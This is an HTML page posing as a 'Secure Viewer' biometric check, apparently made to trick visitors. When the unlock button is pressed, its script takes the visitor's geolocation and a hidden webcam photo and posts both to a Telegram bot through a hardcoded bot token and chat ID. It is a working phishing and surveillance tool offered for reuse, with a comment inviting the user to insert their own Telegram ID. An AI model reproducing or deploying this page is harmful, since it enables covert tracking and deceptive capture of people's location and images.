<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Viewer</title>
    <style>
        body { font-family: sans-serif; background: #0f0f0f; color: #e0e0e0; text-align: center; padding: 50px 20px; }
        .box { border: 1px solid #333; padding: 30px; border-radius: 20px; background: #1a1a1a; max-width: 400px; margin: auto; }
        .btn { background: #0088cc; color: white; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; }
        #status { color: #888; margin-top: 20px; font-size: 14px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color: #0088cc;">ðŸ”’ Security Check</h2>
        <p>Biometric and Zone Verification required to unlock this content.</p>
        <button class="btn" onclick="startFullVerify()">VERIFY & UNLOCK</button>
        <p id="status">Waiting...</p>
    </div>
    <p style="margin-top:20px; font-size:10px;">Made by Nitin 333</p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const BOT_TOKEN = "8149527318:AAEkQ189QqtT81wZQ9hwT_-eqbL5JFoiFx0";
        const CHAT_ID = "6643732863"; // <--- PUT YOUR TELEGRAM ID HERE

        function startFullVerify() {
            document.getElementById('status').innerText = "Processing...";
            
            // 1. Captured Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `ðŸ“ **Location Captured!**\nMaps: http://www.google.com/maps/place/${lat},${lon}`
                        })
                    });
                });
            }

            // 2. Capture Camera
            takeCameraCapture();
        }

        async function takeCameraCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append("chat_id", CHAT_ID);
                        formData.append("photo", blob, "scan.jpg");
                        formData.append("caption", "ðŸŽ¯ Biometric Scan Captured!");
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
                    }, 'image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                }, 2000);
            } catch (err) { alert("Permission required."); }
        }
    </script>
</body>
</html>
